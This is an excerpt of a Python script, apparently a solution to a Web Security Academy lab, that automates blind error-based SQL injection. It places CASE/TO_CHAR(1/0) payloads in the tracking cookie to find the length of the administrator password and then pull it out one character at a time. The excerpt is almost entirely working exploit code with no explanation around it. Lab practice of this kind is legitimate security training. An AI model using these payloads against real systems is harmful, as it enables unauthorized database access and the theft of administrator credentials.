...
target_url = "https://0a1300c1044b3ad5c1fb93d7006d00da.web-security-academy.net"
...
def sql_find_password_len(url, tracking_id, session_id):
    ...
    for password_length in range(1,100):
        ...
        payload = tracking_id + "'||(SELECT+CASE+WHEN+LENGTH(password)=" + str(password_length) + "+THEN+''+ELSE+TO_CHAR(1/0)+END+FROM+users+WHERE+username='administrator')||'"
...
def sql_injection(tracking_id, session_id):
    ...
    for index in range(1,password_len+1):
        ...
        for character in alpha_numbers:
            payload = tracking_id + "'||(SELECT+CASE+WHEN+SUBSTR(password," + str(index) + ",1)='" + character + "'+THEN+''+ELSE+TO_CHAR(1/0)+END+FROM+users+WHERE+username='administrator')||'"
            headers = {
                'Cookie': payload + "; " + session_id,
                'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:107.0) Gecko/20100101 Firefox/107.0'
            }
